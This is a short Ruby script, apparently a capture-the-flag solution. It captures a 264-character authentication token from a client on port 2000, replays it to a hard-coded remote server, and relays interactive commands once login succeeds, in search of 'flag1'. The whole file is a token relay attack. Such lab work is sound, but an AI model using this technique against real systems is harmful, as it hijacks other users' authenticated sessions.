
require 'socket'

$token = ""

# 取得client傳送過來的封包
server = TCPServer.new 2000 
loop do
	  client = server.accept    
	  # 取得封包
	  $token = client.gets
	  # 檢查封包長度
	  if $token.length == 264
	  	puts $token
	  	break
	  # 長度錯誤
	  else 
		puts "$token error"
	  end
end

$state = 0


# 轉送封包，等待登入成功後開始送指令找flag1
s = TCPSocket.new '140.113.194.85', 49175
# 轉送封包
s.puts $token
cmd = "first"

while line = s.recv(2048) 
	  puts line         
	  if $state == 0
		# 登入成功
		if line.include? "Login Success"
			$state = 1
			next
		end
	  end
	  # 輸入指令
	  if $state == 1
		  if line.include? cmd
			  next
		  end
		  print "#"
	          cmd = gets
	          s.puts cmd
	  end
end

s.close             
